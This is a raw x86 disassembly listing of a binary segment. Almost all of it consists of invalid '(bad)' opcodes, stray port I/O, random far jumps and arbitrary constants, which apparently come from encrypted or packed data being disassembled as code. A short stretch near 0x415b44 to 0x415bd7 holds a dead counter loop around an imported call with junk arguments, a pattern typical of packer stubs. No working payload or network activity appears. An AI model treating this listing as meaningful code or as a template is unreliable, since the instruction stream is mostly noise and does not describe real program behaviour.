  4158ad:	sti    
  4158ae:	imul   BYTE PTR ds:0xfd8d80f4
  4158b4:	inc    ebx
  4158b5:	sub    eax,0x3e0767c2
  4158ba:	pop    edx
  4158bb:	pop    ss
  4158bc:	ins    DWORD PTR es:[edi],dx
  4158bd:	and    BYTE PTR [ebx],bl
  4158bf:	adc    bh,dh
  4158c1:	dec    ecx
  4158c2:	cmc    
  4158c3:	mov    ecx,0x658951b9
  4158c8:	not    bl
  4158ca:	jmp    0xec76:0x2c0b7ac
  4158d1:	push   eax
  4158d2:	dec    ebx
  4158d3:	cmp    eax,0xc038ef27
  4158d8:	inc    ecx
  4158d9:	lds    edx,FWORD PTR [edi+0x1a985976]
  4158df:	jl     0x4158ae
  4158e1:	out    dx,al
  4158e2:	mov    ds:0xd0a0ced6,eax
  4158e7:	rcpps  xmm7,XMMWORD PTR [edx-0x73540418]
  4158ee:	push   es
  4158ef:	jnp    0x415918
  4158f1:	mov    ebp,0x28cc8ee1
  4158f6:	pop    ecx
  4158f7:	inc    esp
  4158f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158f9:	add    eax,ecx
  4158fb:	pop    ebp
  4158fc:	and    DWORD PTR [ebp-0x6f],ebp
  4158ff:	mov    ah,0xad
  415901:	cld    
  415902:	jns    0x4158f9
  415904:	lods   eax,DWORD PTR ds:[esi]
  415905:	in     al,dx
  415906:	retf   
  415907:	cmp    eax,0x440c44b8
  41590c:	(bad)  
  41590d:	ins    DWORD PTR es:[edi],dx
  41590e:	cmp    al,0x1d
  415910:	out    0xac,eax
  415912:	jbe    0x415918
  415914:	(bad)
  415917:	repnz inc esi
  415919:	enter  0x4e4,0xee
  41591d:	scas   al,BYTE PTR es:[edi]
  41591e:	(bad)  
  41591f:	xor    ecx,esi
  415921:	jmp    0xfaec:0x172be330
  415928:	lds    esi,FWORD PTR [ecx+0x2b]
  41592b:	test   eax,0x7e9ef5e
  415930:	jmp    0x4158e8
  415932:	sub    eax,0x20727ffe
  415937:	jg     0x415915
  415939:	push   ecx
  41593a:	dec    ebp
  41593b:	int    0xb7
  41593d:	stc    
  41593e:	inc    ecx
  41593f:	and    eax,0x8717a3c
  415944:	nop
  415945:	and    eax,0x16b75365
  41594a:	(bad)  
  41594c:	mov    esi,0xe015bac1
  415951:	dec    esp
  415952:	dec    ecx
  415953:	jae    0x415985
  415955:	cmp    DWORD PTR [ecx+0x73e4b285],esp
  41595b:	adc    eax,0x5b23bcad
  415960:	xchg   ebx,eax
  415961:	push   es
  415962:	jne    0x415995
  415964:	xor    esi,edi
  415966:	loope  0x41595f
  415968:	adc    DWORD PTR [ebp-0x3a4c9f2e],esp
  41596e:	and    eax,0x31b4ca73
  415973:	push   eax
  415974:	sub    ch,BYTE PTR [esi+eax*4-0x50]
  415978:	adc    eax,0x1a4cdba2
  41597d:	xchg   ebx,eax
  41597e:	mov    WORD PTR [esi+0x32],ds
  415981:	sub    ecx,DWORD PTR [eax]
  415983:	push   edi
  415984:	cmp    al,0x44
  415986:	cmp    al,0xad
  415988:	sub    dh,BYTE PTR [ecx-0x439dabe3]
  41598e:	sbb    al,0xa3
  415990:	jne    0x4159dd
  415992:	or     eax,0xcfa65dcd
  415997:	aaa    
  415998:	xchg   edi,eax
  415999:	add    BYTE PTR [ebx+0x7d2e35ca],0x77
  4159a0:	mov    ds:0x4ff1cd1c,al
  4159a5:	adc    ah,dh
  4159a7:	ins    BYTE PTR es:[edi],dx
  4159a8:	scas   al,BYTE PTR es:[edi]
  4159a9:	(bad)  
  4159aa:	pop    esp
  4159ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159ac:	or     al,0x64
  4159ae:	hlt    
  4159af:	and    BYTE PTR [esi+edx*4],al
  4159b2:	add    BYTE PTR ds:0x2df4c464,dh
  4159b8:	loope  0x415a28
  4159ba:	sar    DWORD PTR [ecx],cl
  4159bc:	pop    ebx
  4159bd:	aaa    
  4159be:	das    
  4159bf:	mov    edi,0x152641c6
  4159c4:	shl    al,1
  4159c6:	out    0x38,al
  4159c8:	gs icebp 
  4159ca:	daa    
  4159cb:	fwait
  4159cc:	add    al,0x4f
  4159ce:	jb     0x415983
  4159d0:	out    0xda,eax
  4159d2:	stos   DWORD PTR es:[edi],eax
  4159d3:	test   BYTE PTR [edi],dh
  4159d5:	bound  edx,QWORD PTR [esi+0x17c5df12]
  4159db:	push   edi
  4159dc:	inc    esp
  4159dd:	ins    DWORD PTR es:[edi],dx
  4159de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159df:	jge    0x415992
  4159e1:	shl    BYTE PTR [edx-0x41],0x40
  4159e5:	es xchg edx,eax
  4159e7:	adc    eax,0x37d76da0
  4159ec:	test   BYTE PTR [edx-0x42facead],al
  4159f2:	jb     0x4159c9
  4159f4:	jl     0x4159a8
  4159f6:	dec    ecx
  4159f7:	(bad)  
  4159f8:	stos   BYTE PTR es:[edi],al
  4159f9:	into   
  4159fa:	cld    
  4159fb:	jns    0x415a05
  4159fd:	push   esi
  4159fe:	inc    edx
  4159ff:	pop    eax
  415a00:	jmp    0xf941dec6
  415a05:	imul   ebx,DWORD PTR [eax-0x62da7b95],0xaeda0103
  415a0f:	add    al,0x7f
  415a11:	pop    esp
  415a12:	outs   dx,DWORD PTR ds:[esi]
  415a13:	dec    esp
  415a14:	test   al,0x72
  415a16:	int    0x96
  415a18:	out    dx,al
  415a19:	into   
  415a1a:	fs das 
  415a1c:	pop    ecx
  415a1d:	dec    sp
  415a1f:	cmp    dl,0xd4
  415a22:	repnz add eax,0x1f468ce4
  415a28:	dec    edx
  415a29:	xor    BYTE PTR [eax+0x2953e2b2],dh
  415a2f:	shl    DWORD PTR [edi-0x9],cl
  415a32:	std    
  415a33:	mov    bh,0x61
  415a35:	jecxz  0x415a48
  415a37:	rcr    dh,cl
  415a39:	rcr    BYTE PTR [edx+0x49],cl
  415a3c:	sub    BYTE PTR [esi+0x799af29e],bh
  415a42:	mov    ds:0x28bec8c6,eax
  415a47:	push   es
  415a48:	mov    BYTE PTR [ecx+ebp*2+0x10],ah
  415a4c:	fsub   QWORD PTR [ebp+0x779488d1]
  415a52:	test   al,0xef
  415a54:	div    ch
  415a56:	repz ja 0x415a8f
  415a59:	xor    bl,ah
  415a5b:	push   es
  415a5c:	pusha  
  415a5d:	inc    esi
  415a5e:	inc    ecx
  415a5f:	xor    eax,0x562a234a
  415a64:	xor    eax,0xc4daf52e
  415a69:	dec    ebp
  415a6a:	xchg   BYTE PTR [edx-0x6a153a89],ah
  415a70:	xor    BYTE PTR [eax],dl
  415a72:	pop    eax
  415a73:	mov    cl,0x6a
  415a75:	test   al,0x9
  415a77:	mov    dl,0x5f
  415a79:	jle    0x415a56
  415a7b:	cdq    
  415a7c:	pop    ebx
  415a7d:	in     al,0xe
  415a7f:	scas   eax,DWORD PTR es:[edi]
  415a80:	inc    ebp
  415a81:	out    dx,al
  415a82:	jnp    0x415a98
  415a84:	fistp  WORD PTR [edi+0x6ee4ea8]
  415a8a:	push   edx
  415a8b:	retf   0x9013
  415a8e:	ffreep st(7)
  415a90:	inc    edx
  415a91:	inc    edx
  415a92:	xor    DWORD PTR [ebp+0x1b],esi
  415a95:	lock mov cl,0x96
  415a98:	out    0xb3,eax
  415a9a:	sbb    ah,cl
  415a9c:	add    al,0x7c
  415a9e:	repz xor al,0x62
  415aa1:	dec    edx
  415aa2:	adc    ebp,DWORD PTR [ebx]
  415aa4:	mov    BYTE PTR [edi+0x20],cl
  415aa7:	div    BYTE PTR [ecx-0xe]
  415aaa:	mov    cl,0xcc
  415aac:	pop    es
  415aad:	cwde   
  415aae:	test   eax,0x28cb18a5
  415ab3:	popa   
  415ab4:	mov    ch,0x47
  415ab6:	rcr    DWORD PTR [eax],0x7b
  415ab9:	cli    
  415aba:	jae    0x415b1a
  415abc:	and    al,0x2e
  415abe:	dec    edi
  415abf:	retf   0x79c3
  415ac2:	add    dl,BYTE PTR [ecx]
  415ac4:	or     ch,BYTE PTR [edx]
  415ac6:	enter  0x2c7f,0xc3
  415aca:	jnp    0x415a50
  415acc:	sbb    DWORD PTR [ebx-0x6a],0x79
  415ad0:	repz aam 0xf2
  415ad3:	jnp    0x415a73
  415ad5:	nop
  415ad6:	xor    ah,BYTE PTR [ebp+0x26b70d3a]
  415adc:	adc    ecx,DWORD PTR [edx+ebx*2-0x13]
  415ae0:	sti    
  415ae1:	xor    BYTE PTR [eax+0x2],al
  415ae4:	xchg   BYTE PTR [esi+esi*2+0x250dc94],al
  415aeb:	add    BYTE PTR [ecx+0x1ae64d2c],cl
  415af1:	lods   al,BYTE PTR ds:[esi]
  415af2:	outs   dx,BYTE PTR ds:[esi]
  415af3:	xor    cl,dh
  415af5:	arpl   WORD PTR [esi+0x11],bx
  415af8:	or     DWORD PTR [eax+ecx*4-0x463d369],ecx
  415aff:	mov    cl,0x44
  415b01:	retf   0x6f1a
  415b04:	xchg   BYTE PTR [esi+0x51efb1c0],dl
  415b0a:	xchg   ecx,eax
  415b0b:	lea    edi,[ebp-0x11]
  415b0e:	lea    esi,[eax-0x1]
  415b11:	sbb    bh,BYTE PTR [ebx+ebx*8]
  415b14:	fbstp  TBYTE PTR [edi-0x32b6c13e]
  415b1a:	daa    
  415b1b:	mov    eax,ds:0x976d0206
  415b20:	lahf   
  415b21:	cmp    ecx,DWORD PTR [edi+0x47]
  415b24:	cmp    al,0xf5
  415b26:	push   ebp
  415b27:	(bad)  
  415b28:	out    dx,eax
  415b29:	and    esp,DWORD PTR [ebp-0x23]
  415b2c:	ror    DWORD PTR ds:0x19b4da4d,0xb2
  415b33:	mov    al,0x88
  415b35:	icebp  
  415b36:	or     eax,0xc558bd2
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0x7e1518bc
  415bea:	call   DWORD PTR [edi+0xd]
  415bed:	inc    edi
  415bee:	popa   
  415bef:	bound  edx,QWORD PTR [edx+0x5f]
  415bf2:	bound  esp,QWORD PTR [edx-0x7f]
  415bf5:	mov    DWORD PTR [edx],ebp
  415bf7:	jne    0x415c32
  415bf9:	fild   QWORD PTR fs:[eax+edx*4]
  415bfd:	adc    cl,BYTE PTR [ebx-0x34aabe63]
  415c03:	retf   0x4c11
  415c06:	mov    eax,edi
  415c08:	rcl    BYTE PTR [edx],cl
  415c0a:	pop    es
  415c0b:	js     0x415c76
  415c0d:	and    al,BYTE PTR [esi+0x2a]
  415c10:	jge    0x415c4a
  415c12:	(bad)  
  415c13:	jno    0x415bc2
  415c15:	into   
  415c16:	add    ebx,DWORD PTR [edi+0x3c]
  415c19:	stos   DWORD PTR es:[edi],eax
  415c1a:	push   ebx
  415c1b:	test   DWORD PTR [ecx+0x75b3cfc5],esp
  415c21:	sbb    al,0xad
  415c23:	sbb    eax,0x832567d1
  415c28:	or     bh,cl
  415c2a:	sub    edx,DWORD PTR [edi-0x663cff41]
  415c30:	cmp    DWORD PTR [esi],0x66f6f58a
  415c36:	jg     0x415bc5
  415c38:	xchg   dh,ch
  415c3a:	xor    ebp,eax
  415c3c:	loop   0x415c51
  415c3e:	and    al,0x9c
  415c40:	xor    BYTE PTR [edx+0x11],cl
  415c43:	cmp    ecx,DWORD PTR [eax-0x435a89c9]
  415c49:	stc    
  415c4a:	mov    bh,0x56
  415c4c:	xchg   dh,bl
  415c4e:	add    BYTE PTR [eax],0x91
  415c51:	es ins DWORD PTR es:[edi],dx
  415c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c54:	and    dl,ch
  415c56:	sub    eax,0xa3cf5bed
  415c5b:	hlt    
  415c5c:	jg     0x415c03
  415c5e:	pop    ds
  415c5f:	and    edx,eax
  415c61:	lahf   
  415c62:	push   es
  415c63:	push   ecx
  415c64:	jle    0x415ccf
  415c66:	fild   DWORD PTR [edx-0x1ffdf2bb]
  415c6c:	loop   0x415c36
  415c6e:	sbb    eax,0xa65f6834
  415c73:	ss aam 0x1f
  415c76:	inc    ebx
  415c77:	pusha  
  415c78:	inc    ecx
  415c79:	outs   dx,DWORD PTR ds:[esi]
  415c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c7b:	addr16 mov esi,0x991a5d2e
  415c81:	mov    eax,ds:0x11a4b05
  415c86:	in     eax,0x60
  415c88:	add    edi,0x470f4ab6
  415c8e:	aad    0x5
  415c90:	or     eax,0x6d2bff96
  415c95:	fcmovnb st,st(0)
  415c97:	push   edx
  415c98:	inc    edi
  415c99:	mov    ds:0xc47194d,al
  415c9e:	mov    edi,0xaf2fa794
  415ca3:	lods   eax,DWORD PTR ds:[esi]
  415ca4:	in     al,dx
  415ca5:	and    cl,BYTE PTR [esi-0x534fd8c5]
  415cab:	je     0x415c5d
  415cad:	push   esi
  415cae:	push   ds
  415caf:	push   ss
  415cb0:	xor    BYTE PTR [edx+0x68],cl
  415cb3:	into   
  415cb4:	mov    dl,0x34
  415cb6:	stos   DWORD PTR es:[edi],eax
  415cb7:	dec    ebx
  415cb8:	adc    DWORD PTR [eax],ebx
  415cba:	ror    BYTE PTR [eax+0x24],1
  415cbd:	sbb    eax,0x40185fd1
  415cc2:	push   ebp
  415cc3:	add    BYTE PTR [ebp+ecx*2+0x2b],bh
  415cc7:	adc    BYTE PTR [edx+0xe],0xff
  415ccb:	std    
  415ccc:	gs jnp 0x415d0a
  415ccf:	dec    eax
  415cd0:	push   es
  415cd1:	pop    ss
  415cd2:	(bad)  
  415cd3:	call   0x23e7fdd
  415cd8:	xchg   DWORD PTR [ebx],ecx
  415cda:	and    BYTE PTR [esi-0x26],al
  415cdd:	pushf  
  415cde:	xor    ecx,DWORD PTR [ebp-0x5d]
  415ce1:	pop    ds
  415ce2:	jae    0x415c91
  415ce4:	sbb    eax,0x795f312f
  415ce9:	mov    WORD PTR [edx-0x1eb58a11],cs
  415cef:	addr16 and cl,dh
  415cf2:	test   eax,0x8dc21da
  415cf7:	push   eax
  415cf8:	rcl    DWORD PTR [edi],cl
  415cfa:	xor    dh,ah
  415cfc:	mov    bl,0xac
  415cfe:	and    esp,DWORD PTR [ebp+0x4a]
  415d01:	inc    esi
  415d02:	add    al,0x41
  415d04:	push   esi
  415d05:	cld    
  415d06:	inc    edx
  415d07:	inc    edi
  415d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d09:	mov    cl,0xb5
  415d0b:	xchg   DWORD PTR [ecx+esi*8-0x6207670e],esp
  415d12:	xor    BYTE PTR [edx+ecx*2],0xf5
  415d16:	loope  0x415d8d
  415d18:	push   0xde375afc
  415d1d:	out    dx,eax
  415d1e:	out    dx,eax
  415d1f:	unpcklps xmm3,xmm1
  415d22:	sbb    al,0xb1
  415d24:	jmp    0x917c:0xebfc66b4
  415d2b:	rcr    DWORD PTR [ecx],cl
  415d2d:	mov    ebx,0xfbdcb6aa
  415d32:	call   0x49737bf3
  415d37:	mov    ch,0x83
  415d3a:	lds    esp,FWORD PTR [ebx-0x7d507dc4]
  415d40:	adc    al,0x78
  415d42:	mov    ah,BYTE PTR [edx+0x6ee8af4b]
  415d48:	sbb    eax,0xc346a8e2
  415d4d:	jnp    0x415d75
  415d4f:	shl    DWORD PTR [edx-0x53],1
  415d52:	and    ah,ch
  415d54:	pop    ebx
  415d55:	and    ebp,esi
  415d57:	inc    edx
  415d58:	jnp    0x415d68
  415d5a:	push   edi
  415d5b:	cmp    BYTE PTR [ecx],dl
  415d5d:	inc    esi
  415d5e:	daa    
  415d5f:	(bad)  
  415d61:	mov    dh,BYTE PTR [eax-0x6d]
  415d64:	xchg   ebx,eax
  415d65:	cmp    BYTE PTR [eax+0x35e6f03d],bh
  415d6b:	outs   dx,DWORD PTR ds:[esi]
  415d6c:	push   ss
  415d6d:	retf   0xe42c
  415d70:	ret    0xf7df
  415d73:	pop    ecx
  415d74:	aaa    
  415d75:	jmp    DWORD PTR [edi-0x214dbcc6]
  415d7b:	pop    ebx
  415d7c:	sub    BYTE PTR [ecx-0x26042528],cl
  415d82:	mov    ds:0x70ba4d53,eax
  415d87:	iret   
  415d88:	sub    al,0x56
  415d8a:	call   0x24548444
  415d8f:	adc    eax,0x1a6d41d6
  415d94:	stc    
  415d95:	call   0x192ca314
  415d9a:	push   edi
  415d9b:	sub    BYTE PTR [ecx-0x39],bl
  415d9e:	lods   eax,DWORD PTR ds:[esi]
  415d9f:	dec    edx
  415da0:	sub    al,0xa1
  415da2:	repnz arpl bx,dx
  415da5:	fsubr  QWORD PTR [edi-0x45]
  415da8:	inc    ebx
  415da9:	inc    esp
  415daa:	push   ss
  415dab:	sbb    ebx,DWORD PTR [ebp-0xea401af]
  415db1:	mov    BYTE PTR [ebx],dh
  415db3:	and    ah,ch
  415db5:	sahf   
  415db6:	sar    DWORD PTR [edi],cl
  415db8:	dec    eax
  415db9:	popf   
  415dba:	pusha  
  415dbb:	ficomp WORD PTR [ecx]
  415dbd:	dec    edi
  415dbe:	jb     0x415d87
  415dc0:	jbe    0x415da7
  415dc2:	dec    esp
  415dc3:	out    dx,al
  415dc4:	cmp    esp,0x36
  415dc7:	retf   
  415dc8:	lds    eax,FWORD PTR [ebx]
  415dca:	xchg   esp,eax
  415dcb:	mov    bl,0xf1
  415dcd:	push   es
  415dce:	pop    ebx
  415dcf:	mov    ?,WORD PTR [esp+eiz*4-0x6b]
  415dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dd4:	mov    esi,DWORD PTR [edx]
  415dd6:	adc    al,0x90
  415dd8:	ror    ch,cl
  415dda:	ins    DWORD PTR es:[edi],dx
  415ddb:	sbb    ecx,DWORD PTR [esi]
  415ddd:	add    al,BYTE PTR [ebx+0x1106940a]
  415de3:	lods   al,BYTE PTR ds:[esi]
  415de4:	(bad)  
  415de5:	sti    
  415de6:	ins    DWORD PTR es:[edi],dx
  415de7:	sbb    al,0xc1
  415de9:	ror    DWORD PTR [eax+esi*1-0x42],1
  415ded:	mov    cl,0xc2
  415def:	cmp    al,0xaf
  415df1:	in     al,0xdc
  415df3:	call   0x5d4c0d76
  415df8:	in     eax,0x6e
  415dfa:	dec    esi
  415dfb:	shl    BYTE PTR [esi+0x78471ca4],1
  415e01:	mov    ds:0x4f1c62e7,al
  415e06:	cmp    BYTE PTR [ebp+0x7a],ah
  415e09:	cmp    ah,BYTE PTR [esi+0x54]
  415e0c:	ins    BYTE PTR es:[edi],dx
  415e0d:	inc    DWORD PTR [esi+0x6aab5ac6]
  415e13:	sbb    BYTE PTR [ecx],0xa3
  415e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e17:	test   eax,0x5008ff11
  415e1c:	cmp    DWORD PTR [ebp-0x3c4f504b],ecx
  415e22:	in     eax,dx
  415e23:	retf   0xd6a1
  415e26:	shl    ch,0x60
  415e29:	pop    esi
  415e2a:	inc    eax
  415e2b:	jo     0x415e63
  415e2d:	dec    esi
  415e2e:	arpl   WORD PTR [eax+0x7d],si
  415e31:	pop    esp
  415e32:	out    0x1c,al
  415e34:	(bad)  
  415e35:	iret   
  415e36:	push   eax
  415e37:	jle    0x415e2c
  415e39:	inc    esi
  415e3a:	out    dx,al
  415e3b:	ficom  WORD PTR [ecx-0x70]
  415e3e:	shl    DWORD PTR [edi],0x11
  415e41:	imul   esp,DWORD PTR [ecx+ecx*4],0xffffffcc
  415e45:	shl    BYTE PTR [eax+0xfff4e8f],0x2d
  415e4c:	cmp    edx,DWORD PTR [eax]
  415e4e:	pop    esp
  415e4f:	mov    BYTE PTR [edi+0x14],ch
  415e52:	call   0x78c27240
  415e57:	add    DWORD PTR [eax+0x5e],edi
  415e5a:	iret   
  415e5b:	pop    es
  415e5c:	pop    edi
  415e5d:	jno    0x415e42
  415e5f:	inc    ebx
  415e60:	jne    0x415ed8
  415e62:	pop    es
  415e63:	mov    DWORD PTR [edx+0xfd317c6],edi
  415e69:	imul   edi,DWORD PTR [esi+ecx*4-0xbefcf49],0xffffffba
  415e71:	mov    DWORD PTR [ecx-0x62d10815],esp
  415e77:	iret   
  415e78:	cmp    edx,DWORD PTR [ebp+0x75623be9]
  415e7e:	xor    DWORD PTR [edi+0x400a8ebb],ebx
  415e84:	xchg   bl,al
  415e86:	mov    esp,0x223c1ded
  415e8b:	cmp    al,0xbe
  415e8d:	(bad)  
  415e8e:	arpl   WORD PTR gs:[ebp+0x22],ax
  415e92:	fld    TBYTE PTR [ebx+0x1f]
  415e95:	mov    BYTE PTR [edx+eax*1-0x2c],bl
  415e99:	aaa    
  415e9a:	mov    ch,ah
  415e9c:	outs   dx,BYTE PTR ds:[esi]
  415e9d:	aaa    
  415e9e:	dec    ebp
  415e9f:	push   edx
  415ea0:	test   BYTE PTR [esi],bl
  415ea2:	cld    
  415ea3:	dec    esp
  415ea4:	mov    ebx,0x88092f15
  415ea9:	jmp    0xa93b426a
  415eae:	mov    ecx,0x88f4c8d5
  415eb3:	jp     0x415e84
  415eb5:	dec    eax
  415eb6:	xchg   BYTE PTR [eax+eax*8],ch
  415eb9:	outs   dx,DWORD PTR ds:[esi]
  415eba:	and    edx,esi
  415ebc:	out    0xf3,al
  415ebe:	mov    ebp,0x849d22af
  415ec3:	icebp  
  415ec4:	imul   edi,DWORD PTR [edi+0x2d],0x397d8c8b
  415ecb:	cwde   
  415ecc:	gs daa 
  415ece:	gs nop
  415ed0:	popa   
  415ed1:	int3   
  415ed2:	jl     0x415ecd
  415ed4:	xor    DWORD PTR [eax+0x44],ebx
  415ed7:	dec    ebp
  415ed8:	mov    ch,0x10
  415eda:	cmc    
  415edb:	xchg   ebp,eax
  415edc:	loopne 0x415ec1
  415ede:	shl    DWORD PTR [edi],1
  415ee0:	xchg   edi,eax
  415ee1:	or     ch,dl
  415ee3:	shl    DWORD PTR [esi],1
  415ee5:	hlt    
  415ee6:	sub    ecx,DWORD PTR [eax+0x61]
  415ee9:	nop
  415eea:	sbb    ebx,DWORD PTR [ebx]
  415eec:	(bad)  
  415eed:	call   DWORD PTR [esi+0xc]
  415ef0:	mov    DWORD PTR [ebx],ebx
  415ef2:	xor    edi,DWORD PTR [esi+eiz*8-0x75]
  415ef6:	in     eax,dx
  415ef7:	repnz mov edx,DWORD PTR [eax-0x34]
  415efb:	imul   edi,DWORD PTR [edx+ebx*4-0x80],0xfffffff1
  415f00:	sahf   
  415f01:	xor    eax,0xc477c8b7
  415f06:	sbb    ch,BYTE PTR [esi-0x4c]
  415f09:	enter  0x1de,0x4b
  415f0d:	pop    ss
  415f0e:	test   al,0xf5
  415f10:	or     DWORD PTR [ecx+0x2f],eax
  415f13:	shl    DWORD PTR [ebx+0x36ed0239],cl
  415f19:	shl    ebp,0x51
  415f1c:	dec    edi
  415f1d:	jno    0x415f74
  415f1f:	lods   eax,DWORD PTR ds:[esi]
  415f20:	mov    ch,0x92
  415f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f23:	mov    ch,dl
  415f25:	mov    cl,0x33
  415f27:	lock mov cs,WORD PTR ds:0x30ea9c12
  415f2e:	daa    
  415f2f:	lods   eax,DWORD PTR ds:[esi]
  415f30:	xor    DWORD PTR [edi-0x4b6768a6],0x66d30556
  415f3a:	add    dl,al
  415f3c:	call   0x4f74:0x4397b349
  415f43:	test   DWORD PTR [ecx+eiz*4],esp
  415f46:	into   
  415f47:	rol    DWORD PTR [ebx-0x163687bd],1
  415f4d:	cmp    edx,DWORD PTR [esi]
  415f4f:	add    bl,0x40
  415f52:	mov    ch,0x65
  415f54:	(bad)
  415f57:	mov    ds:0x62a2c64c,eax
  415f5c:	fs push 0x448ac7fd
  415f62:	ret    0xf0c
  415f65:	scas   al,BYTE PTR es:[edi]
  415f66:	mov    esp,edi
  415f68:	repz and al,0xe2
  415f6b:	push   es
  415f6c:	jnp    0x415fd5
  415f6e:	dec    edx
  415f6f:	loope  0x415f46
  415f71:	mov    esp,0xbe4949b
  415f76:	jo     0x415ef9
  415f78:	lahf   
  415f79:	sbb    ah,BYTE PTR [ecx]
  415f7b:	inc    ecx
  415f7c:	xchg   ebp,eax
  415f7d:	(bad)  
  415f7e:	repnz into 
  415f80:	(bad)  [ebx-0x31]
  415f83:	out    dx,eax
  415f84:	pop    ecx
  415f85:	scas   al,BYTE PTR es:[edi]
  415f86:	retf   0x661d
  415f89:	adc    al,0xc5
  415f8b:	scas   al,BYTE PTR es:[edi]
  415f8c:	push   0x344ad850
  415f91:	(bad)  
  415f92:	or     BYTE PTR [esi+0x7b09fe01],dl
  415f98:	loopne 0x415fad
  415f9a:	test   BYTE PTR [ecx+0xc],cl
  415f9d:	xchg   DWORD PTR [ebx-0xa],edi
  415fa0:	shl    DWORD PTR [eax-0x13],1
  415fa3:	xchg   ebp,eax
  415fa4:	(bad)  
  415fa5:	xlat   BYTE PTR ds:[ebx]
  415fa6:	hlt    
  415fa7:	dec    eax
  415fa8:	imul   edx,DWORD PTR [eax+0x5d839782],0xffffffc0
  415faf:	and    DWORD PTR [edi],edi
  415fb1:	mov    al,ds:0x841a992f
  415fb6:	bound  ebp,QWORD PTR [edx+ebx*4+0x72]
  415fba:	mov    bl,0x66
  415fbc:	and    DWORD PTR [ecx-0x1ec6f45f],ebx
  415fc2:	dec    eax
  415fc3:	pop    edx
  415fc4:	lods   al,BYTE PTR ds:[esi]
  415fc5:	sub    BYTE PTR [ebx],bl
  415fc7:	jg     0x415fa7
  415fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fca:	stos   BYTE PTR es:[edi],al
  415fcb:	adc    DWORD PTR [ebx-0x7fe28acf],0xc
  415fd2:	mov    edx,0x3e007e0
  415fd7:	ds scas eax,DWORD PTR es:[edi]
  415fd9:	mov    dh,0xc8
  415fdb:	cdq    
  415fdc:	mov    dl,bl
  415fde:	mov    ds:0xb0c5a745,eax
  415fe3:	add    esi,DWORD PTR [ecx+ebp*1]
  415fe6:	cmc    
  415fe7:	mov    bh,0x1d
  415fe9:	dec    esi
  415fea:	iret   
  415feb:	cmp    ebp,DWORD PTR [eax-0xf]
  415fee:	(bad)  
  415fef:	fcompp 
  415ff1:	shr    BYTE PTR [ebp+0x5660e6a7],cl
  415ff7:	inc    ecx
  415ff8:	sub    cl,BYTE PTR [esi-0x26b4f304]
  415ffe:	loope  0x415fd3
  416000:	hlt    
  416001:	(bad)  
  416002:	ror    DWORD PTR [ecx],1
  416004:	das    
  416005:	pusha  
  416006:	jns    0x41605f
  416008:	in     al,0x66
  41600a:	ds (bad) 
  41600c:	fbld   TBYTE PTR [edi]
  41600e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41600f:	into   
  416010:	mov    eax,0x27edd418
  416015:	dec    esp
  416016:	sub    dl,ch
  416018:	inc    ebx
  416019:	dec    ecx
  41601a:	mov    esp,0x6cc02540
  41601f:	sti    
  416020:	jp     0x4160a1
  416022:	jmp    DWORD PTR [esi]
  416024:	mov    bl,0x8b
  416026:	and    dl,ah
  416028:	test   eax,0x169b0470
  41602d:	xchg   ecx,eax
  41602e:	test   DWORD PTR [edx+0x9368d2f],ecx
  416034:	daa    
  416035:	daa    
  416036:	xor    DWORD PTR [esi-0xa26b67c],ebp
  41603c:	sahf   
  41603d:	and    BYTE PTR es:[ebx],dl
  416040:	lahf   
  416041:	(bad)  
  416043:	dec    ebp
  416044:	and    ecx,DWORD PTR [ecx]
  416046:	push   edx
  416047:	sti    
  416048:	(bad)  
  416049:	pop    ebx
  41604a:	sub    al,0xc3
  41604c:	jns    0x41604d
  41604e:	jmp    0x4160a4
  416050:	cmp    esi,DWORD PTR [ebp+0x17]
  416053:	xor    al,0x38
  416055:	push   esi
  416056:	mov    ecx,0xd0345141
  41605b:	jmp    0xd5927f47
  416060:	push   ss
  416061:	cmp    al,0xc7
  416063:	js     0x416080
  416065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416066:	push   cs
  416067:	cmp    bl,BYTE PTR [eax+0x12]
  41606a:	mov    al,0x8e
  41606c:	mov    bl,0xaf
  41606e:	jb     0x416086
  416070:	jmp    0x17c1b682
  416075:	cmova  edx,eax
  416078:	push   ds
